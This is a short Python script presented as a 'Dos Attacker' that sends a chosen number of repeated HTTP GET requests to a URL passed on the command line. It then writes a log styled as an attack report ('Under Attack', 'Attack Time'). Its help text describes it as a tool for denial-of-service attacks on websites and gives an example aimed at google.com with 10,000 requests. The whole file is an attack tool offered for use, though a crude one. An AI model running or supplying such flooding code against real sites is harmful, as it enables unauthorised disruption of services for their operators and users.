import requests
import time
import sys
from datetime import datetime

URL = str(sys.argv[1])

if URL != 'help':
    times = int(sys.argv[2])
    file_name = str(sys.argv[3])

    all_time = time.time()
    for x in range(times):
        c_time = time.time()
        try:
            s = requests.get(URL)
        except:
            print ('[!!] Cannot get the Website ')
            break

        print ('[+] Got the website : ', str(x + 1 ), ' : ', str(time.time() - c_time ))
        c_time  = time.time()

    finish_time = time.time() - all_time
    attack_time = str(datetime.now())
    f = open(file_name, 'w')
    f.write(f'''

    *****************************
    Dos Attacker by Khalid Obaide
    *****************************
              [report]


    Target Url   : {URL} \n
    Request Sent : {times} \n
    Under Attack : {finish_time}s \n
    Attack Time  : {attack_time} \n


    ''')
    f.close()
else:
    print ('''
    
    *****************************
    Dos Attacker by Khalid Obaide
    *****************************
    
    usage : use this to do Dos attack on websites
    
    $1 : The website Url
    $2 : The Times you want to send request
    $3 : The File you want to save the log in 
    
    example : python3 dos.py https:google.com 10000 log.txt
    
    ''')
# Thanks for khalid obaide Creator of this tool